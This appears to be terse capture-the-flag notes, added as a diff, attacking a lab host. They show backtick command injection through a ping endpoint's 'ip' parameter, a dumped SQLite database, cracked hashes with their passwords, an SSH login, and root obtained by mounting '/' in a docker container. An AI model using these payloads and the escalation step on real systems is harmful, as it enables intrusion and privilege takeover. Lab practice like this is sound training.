@@ -1,0 +1,64 @@
+
+
+
+Allow: *
+User-Agent: *
+Sitemap: /utech_sitemap.txt
+
+
+/
+/index.html
+/what.html
+/partners.html
+
+
+
+on /js/api.js
+
+	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
+
+
+http://10.10.158.39:8081/ping?ip=`ls`
+ping: utech.db.sqlite: Name or service not known 
+
+http://10.10.158.39:8081/ping?ip=`cat%20utech.db.sqlite`
+
+ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Name or service not known 
+
+
+using crackstation
+r00t:n100906
+admin:mrsheafy
+
+┌──(root㉿kali)-[/tmp]
+└─# ssh r00t@10.10.158.39      
+The authenticity of host '10.10.158.39 (10.10.158.39)' can't be established.
+ED25519 key fingerprint is SHA256:bLmuFwYgOKjiHz7U/RpFo8vBnYV7jT65zfMDx14IJCg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.158.39' (ED25519) to the list of known hosts.
+r00t@10.10.158.39's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+...
+
+r00t@ip-10-10-158-39:~$ 
+
+
+r00t@ip-10-10-135-11:/home/lp1$ id
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+r00t@ip-10-10-135-11:/home/lp1$ docker images
+REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+bash         latest    495d6437fc1e   6 years ago   15.8MB
+r00t@ip-10-10-135-11:/home/lp1$ 
+r00t@ip-10-10-135-11:/home/lp1$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+# 
+
+
+
+
+
+
+
